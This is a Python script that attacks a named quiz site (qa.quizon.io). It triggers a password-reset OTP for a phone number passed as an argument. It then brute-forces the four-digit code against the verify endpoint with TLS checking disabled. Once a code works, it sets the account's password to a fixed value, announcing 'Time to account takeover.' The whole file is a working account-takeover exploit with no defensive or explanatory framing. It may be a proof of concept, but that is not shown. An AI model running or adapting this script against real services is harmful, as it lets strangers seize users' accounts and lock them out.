import requests ,sys , json
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}
http_proxy = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}



def open_browser():
    browser = requests.get(
        'https://qa.quizon.io/', verify=False, headers=headers)
    return browser

def setnew_pass(cookie):
    session = requests.Session()
    URL = 'https://qa.quizon.io/setNewForgotPass'
    cookies = {'quizon_sess': cookie['quizon_sess']}
    payload = {
        'password': 123123,
        'confirm_password': 123123
    }
    response = session.post(url=URL, data=payload,
                            verify=False, headers=headers, cookies=cookies)
    if response.status_code == 200:
        status = json.loads(response.content)
        print('[+]', status['err_msg'])
        print('[+] New pass: 123123')
        return response


def reset_pass(number, cookie):
    session = requests.Session()
    URL = 'https://qa.quizon.io/sendForgotPasswordRequest'
    cookies = {'quizon_sess': cookie['quizon_sess']}
    payload = {
        'purpose': 'reg',
        'msisdn': number
    }
    response = session.post(url=URL, data=payload, 
                            verify=False, headers=headers, cookies=cookies)
    if response.status_code == 200:
        return response


def pass_brute(otp, cookie_info):
    session = requests.Session()
    URL = 'https://qa.quizon.io/forgotPassVerify'
    cookies = {'quizon_sess': cookie_info['quizon_sess']}
    payload = {
        'no1': str(otp)[0:1],
        'no2': str(otp)[1:2],
        'no3': str(otp)[2:3],
        'no4': str(otp)[3:4],
    }
    response = session.post(url=URL, data=payload, cookies=cookies, proxies=http_proxy,
                            verify=False, headers=headers)
    return response

def magic(cookie):
    for otp in range(1111, 9999):
        response = pass_brute(otp, cookie)
        if response.url == 'https://qa.quizon.io/setNewPassword':
            print("[+] OTP Found! : ", otp)
            if setnew_pass(cookie):
                break


if __name__ == '__main__':
    if len(sys.argv) == 2:
        print("[+] Trying to send OTP.")
        cookie = open_browser().cookies.get_dict()
        reset = reset_pass(sys.argv[1], cookie)
        status = json.loads(reset.content)
        if status['status']:
            print("[+] Sending OTP successfull to ", sys.argv[1])
            print("[+] Time to account takeover. It will take more or less 5 minutes.")
            if status['err_msg']:
                print('[+]', status['err_msg'])
            magic(cookie)
        else:
            print('[-]', status['err_msg'])
    else:
        print('Please pass an arugemnt!')
